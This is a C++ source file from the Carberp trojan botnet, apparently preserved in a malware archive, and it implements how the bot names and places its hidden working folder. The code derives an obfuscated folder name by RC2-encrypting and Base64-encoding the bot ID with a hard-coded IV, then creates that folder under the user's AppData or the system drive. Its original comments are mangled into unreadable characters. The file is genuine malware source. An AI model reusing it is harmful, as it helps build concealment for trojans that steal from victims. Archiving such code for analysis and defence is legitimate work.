/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
#include <shlobj.h>
#include "BotCore.h"

//---------------------------------------------------------------------------

//const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};


//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;




PCHAR BotGetWorkFolder()
{
	
	// ������� ���������� ������� ������� ���� (�������� ���)
	// ��� ����� �������� �� ���� ����, ������� ����������� ������ ����������
	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// �������� ��� � ������� ���
	PCHAR UID = GenerateBotID();

    PCHAR Password = GetMainPassword(true);

    const static char IV[] = {'d', 'j', 't', 'm', 'f', 'p', 'H', 'k',  0};

	DWORD BufSize = StrCalcLength(UID);
	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);

	// ���������� ��������� ������� � ����������
	for (PCHAR S = B64; *S != 0; S++)
    {
		if (*S == '/')
			*S = 'z';  // ������������ ������
		else
		if (*S == '+')
			*S = 'v';  // ����� ����������� � ���������, �� ������� ����� :))
	}

	// �������� ������
	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
	if (MCopy > STR::Length(B64))
		MCopy = STR::Length(B64);

	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);

	// ���������� ������������� ������
	STR::Free(Password);
	STR::Free(UID);
	MemFree(Encrypted);
	STR::Free(B64);

	// ����������� ���
	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------

PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// ������� ���������� ������� ������� ����

	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, TRUE))
		return NULL;


	if (InSysPath)
	{
		// �������� ���� � ��������� �����
		PCHAR Tmp = STR::Scan(Path, ':');
		if (Tmp == NULL)
			return NULL;
        Tmp++;
		*Tmp = 0;
	}


    PCHAR WorkPath = BotGetWorkFolder(); // ����������� �� �������

	// ��������� �������� ����
	StrConcat(Path, "\\");
	StrConcat(Path, WorkPath);

	if (!DirExists(Path))
		pCreateDirectoryA(Path, NULL);

	StrConcat(Path, "\\");

	// ��������� ������������
	if (!STR::IsEmpty(SubDir))
	{
		StrConcat(Path, SubDir);

		if (!DirExists(Path))
			pCreateDirectoryA(Path, NULL);
    }

	PCHAR Result = STR::New(2, Path, FileName);
    STR::Free(Path);
	return  Result;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  ������� ���������� ������� ���� ����
    return BOTDoGetWorkPath(false, SubDir, FileName);

}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  ������ ������� GetWorkPath.
	//  ������� �� ����� �� ��� � ���, ��� �����
	//   �������� � ����� ���������� �����
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  ������� ���������� ��� ����� ������� �����
	BotGetWorkFolder();
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------
